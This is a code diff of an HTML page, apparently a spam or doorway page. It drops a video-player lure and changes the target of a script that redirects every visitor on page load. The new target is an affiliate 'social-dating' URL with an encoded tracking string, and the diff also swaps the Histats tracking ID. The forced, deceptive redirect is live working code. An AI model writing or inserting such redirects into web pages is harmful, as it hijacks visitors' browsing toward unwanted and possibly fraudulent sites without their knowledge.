@@ -1,15 +1,12 @@
-<div class="video-wrapper">
-<video controls autoplay muted playsinline  controlsList="nodownload nofullscreen noremoteplayback" disablePictureInPicture poster="https://cdn.aceimg.com/90db8453f.jpg">
-
 <script>
-    window.location.replace("https://hypothesisgarden.com/ad2seskt?key=ac87ff650a4fb459cf6428b403424576");
+    window.location.replace("https://vilury.com/social-dating?h=waWQiOjEwMzkzNTQsInNpZCI6MTYzMzcxNSwid2lkIjo3MzI5NTAsInNyYyI6Mn0=eyJ&si1=&si2=");
   </script>
 </head>
 <body>
 
    <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,4573229,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,5007039,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -17,5 +14,8 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4573229&101" alt="" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5007039&101" alt="" border="0"></a></noscript>
 <!-- Histats.com  END  -->
+
+</body>
+</html>
